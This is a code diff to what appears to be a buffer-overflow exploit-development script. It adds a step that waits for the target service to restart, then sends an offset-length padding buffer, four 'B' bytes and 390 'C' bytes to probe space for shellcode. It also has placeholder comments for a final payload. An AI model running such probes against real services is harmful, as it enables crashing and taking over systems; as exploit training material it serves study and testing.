@@ -68,6 +68,17 @@ class Main:
 
             print("[*] Sending all chars for bad char check...\n")
             fuzz.send_payload("A" * offset + "B" * 4 + bad_characters())
+            
+            print("[!] Waiting for application to restart.\n")
+            fuzz.is_target_up()
+
+            print("[*] Sending buffer + 4 * 'B' + 390 * 'C'\n")
+            fuzz.send_payload("A" * offset + "B" * 4 + "C" * 390)
+            
+            # Get user input
+            # Build and send generic test payload hail mary
+            
+            # Exit
             sys.exit()
 
         else:
